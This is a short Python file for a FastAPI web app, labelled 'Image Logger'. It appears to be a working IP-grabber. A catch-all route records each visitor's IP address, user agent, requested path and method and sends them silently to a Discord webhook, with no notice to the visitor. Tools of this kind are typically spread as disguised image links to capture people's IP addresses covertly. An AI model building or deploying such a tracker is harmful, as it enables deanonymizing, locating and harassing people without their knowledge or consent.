from fastapi import FastAPI, Request
import requests
import os

app = FastAPI()

# Use an environment variable for security
WEBHOOK_URL = os.getenv("WEBHOOK_URL")  # Set this in Vercel environment variables

@app.api_route("/{path:path}", methods=["GET", "POST"])
async def handle_request(request: Request, path: str):
    try:
        # Get client IP
        ip = request.headers.get("x-forwarded-for", request.client.host)
        user_agent = request.headers.get("user-agent")

        # Prepare Discord message
        message = {
            "username": "Image Logger",  # Display name in Discord
            "embeds": [{
                "title": "New Request Received",
                "color": 0x00FFFF,
                "fields": [
                    {"name": "IP", "value": ip, "inline": True},
                    {"name": "User-Agent", "value": user_agent, "inline": False},
                    {"name": "Path", "value": path, "inline": True},
                    {"name": "Method", "value": request.method, "inline": True}
                ]
            }]
        }

        # Send to Discord webhook
        response = requests.post(WEBHOOK_URL, json=message, timeout=5)

        if response.status_code != 204:
            # Discord returns 204 for success
            return {"status": "error sending webhook", "details": response.text}

        return {"status": "ok"}

    except Exception as e:
        return {"error": str(e)}
